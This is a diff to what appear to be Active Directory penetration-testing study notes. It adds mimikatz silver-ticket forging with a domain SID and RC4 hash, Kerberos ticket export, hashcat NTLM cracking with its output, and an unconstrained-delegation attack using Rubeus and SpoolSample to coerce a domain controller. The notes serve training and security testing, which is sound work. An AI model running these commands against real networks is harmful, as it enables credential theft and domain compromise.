@@ -467,6 +467,8 @@ Silver tickets are essential forged TGS tickets which grant you access to a part
 
 #### Mimikatz Workflow
 
+Guide to mimikatz: https://adsecurity.org/?page_id=1821
+
 1. Obtain SID
 
 ```powershell
@@ -489,11 +491,18 @@ mimikatz # kerberos::list
 
 mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
 
-
-mimikatz # kerberos::list
-
 #finally launch cmd on behalf of impersonated service
 mimikatz # misc::cmd
+
+```
+
+Export tickets to kali
+
+```bash
+
+mimikatz # kerberos::list /export
+
+
 
 ```
 
@@ -537,7 +546,7 @@ Access anything without knowing the user
 `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
 
 
-### Hash cracking
+## Hash cracking
 
 
 * MsCacheV2
@@ -548,7 +557,7 @@ Access anything without knowing the user
 
 `hashcat -a 0 -m 1000 admin.hashfile  /usr/share/wordlists/rockyou.txt --force --potfile-disable`
 
-### Distributed Component Object Model
+## Distributed Component Object Model
 
 
 
@@ -619,6 +628,26 @@ Bytes.....: 53357329
 Keyspace..: 14344385
 
 64f12cddaa88057e06a81b54e73b949b:Password1                
+
+## Delegation Vulnerabilities
+
+### Unconstrained delegation
+
+A  mechanism where a user sends its credentials to a service and then the service accesses resources on the user’s behalf.
+
+* find computers with trust for delegation
+`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
+
+* monitor incoming tickets
+`Rubeus.exe monitor /interval:1`
+
+* force DC to connect to it via MS-RPRN RPC interface: kudos https://github.com/leechristensen/SpoolSample
+`.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB`
+
+### Constrained delegation
+
+Constrained delegation, if delegation must be used, is a much safer alternative as it restricts delegation to specific services. 
+
 
 
 ## Additional Reading
